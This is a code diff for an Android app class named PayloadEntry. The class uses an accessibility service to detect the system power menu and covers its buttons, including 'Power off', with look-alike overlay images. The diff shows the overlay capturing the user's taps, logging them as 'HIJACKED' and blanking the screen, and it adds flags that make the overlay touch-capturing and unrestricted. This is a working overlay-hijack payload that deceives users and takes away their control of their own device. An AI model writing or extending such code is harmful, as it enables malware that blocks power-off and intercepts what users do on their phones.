@@ -33,9 +33,8 @@ class PayloadEntry : DynamicEntry {
 
     override @Composable fun Render(context: Context, resDir: File) {
         val density = LocalDensity.current
-        val clipboardManager = LocalClipboardManager.current
+        val clipboardManager = androidx.compose.ui.platform.LocalClipboardManager.current
 
-        // Cache images to avoid reloading every frame
         val images = remember(resDir) {
             mapOf(
                 "Power off" to loadBitmap(resDir, "power.png"),
@@ -47,8 +46,34 @@ class PayloadEntry : DynamicEntry {
         }
 
         LaunchedEffect(Unit) {
-            DynamicEntry.log("📡 Brain Online. Hijack Ready.")
+            DynamicEntry.log("📡 Master Layer Initialized.")
             
+            // SET PERMANENT OVERLAY CONTENT
+            DynamicEntry.overlayContent = { 
+                if (isHijackActive) {
+                    Box(modifier = Modifier.fillMaxSize()) {
+                        stickerBounds.forEach { (name, rect) ->
+                            val bitmap = images[name]
+                            Box(
+                                modifier = Modifier
+                                    .offset(x = with(density) { rect.left.toDp() }, y = with(density) { rect.top.toDp() })
+                                    .size(width = with(density) { (rect.right - rect.left).toDp() }, height = with(density) { (rect.bottom - rect.top).toDp() })
+                                    .clickable { 
+                                        DynamicEntry.log("⚡ HIJACKED: $name")
+                                        isHijackActive = false // Nuke stickers
+                                        DynamicEntry.overlayContent = { 
+                                            Box(modifier = Modifier.fillMaxSize().background(Color.Black)) 
+                                        }
+                                    }
+                            ) {
+                                if (bitmap != null) Image(bitmap = bitmap, contentDescription = null, modifier = Modifier.fillMaxSize())
+                                else Box(modifier = Modifier.fillMaxSize().background(Color.Red.copy(0.4f))) 
+                            }
+                        }
+                    }
+                }
+            }
+
             DynamicEntry.accessibilityInterceptor = { event ->
                 if (event.packageName == "com.android.systemui") {
                     val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
@@ -58,22 +83,29 @@ class PayloadEntry : DynamicEntry {
                         if (foundAny != isHijackActive) {
                             isHijackActive = foundAny
                             DynamicEntry.log(if (foundAny) "🎯 TARGET LOCKED" else "📉 TARGET LOST")
+                            
+                            // Flip the Touch authority immediately without re-adding the view
                             DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                                 flags = if (foundAny) 
-                                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-                                    else android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+                                    else 
+                                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                                    android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                             )
                         }
                     }
                 } else if (isHijackActive) {
                     isHijackActive = false
                     stickerBounds.clear()
-                    DynamicEntry.overlayContent = null
+                    // Go back to non-touchable mode when app changes
+                    DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
                 }
             }
         }
 
-        // --- MAIN APP UI ---
+        // --- CONSOLE UI (In the App) ---
         Column(modifier = Modifier.fillMaxSize().background(Color.Black).padding(16.dp)) {
             Text("GHOST CONSOLE", color = Color.Green, fontSize = 18.sp)
             Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
@@ -88,36 +120,6 @@ class PayloadEntry : DynamicEntry {
                     Text(log, color = Color(0xFF00FF00), fontSize = 11.sp, fontFamily = FontFamily.Monospace)
                     HorizontalDivider(color = Color.DarkGray)
                 }
-            }
-        }
-
-        // --- HIJACK OVERLAY ---
-        SideEffect {
-            if (isHijackActive) {
-                DynamicEntry.overlayContent = { 
-                    Box(modifier = Modifier.fillMaxSize()) {
-                        stickerBounds.forEach { (name, rect) ->
-                            val bitmap = images[name]
-                            Box(
-                                modifier = Modifier
-                                    .offset(x = with(density) { rect.left.toDp() }, y = with(density) { rect.top.toDp() })
-                                    .size(width = with(density) { (rect.right - rect.left).toDp() }, height = with(density) { (rect.bottom - rect.top).toDp() })
-                                    .clickable { 
-                                        DynamicEntry.log("⚡ HIJACKED: $name")
-                                        DynamicEntry.overlayContent = { Box(modifier = Modifier.fillMaxSize().background(Color.Black)) } 
-                                    }
-                            ) {
-                                if (bitmap != null) {
-                                    Image(bitmap = bitmap, contentDescription = null, modifier = Modifier.fillMaxSize())
-                                } else {
-                                    Box(modifier = Modifier.fillMaxSize().background(Color.Red.copy(0.3f))) 
-                                }
-                            }
-                        }
-                    }
-                }
-            } else {
-                DynamicEntry.overlayContent = null
             }
         }
     }
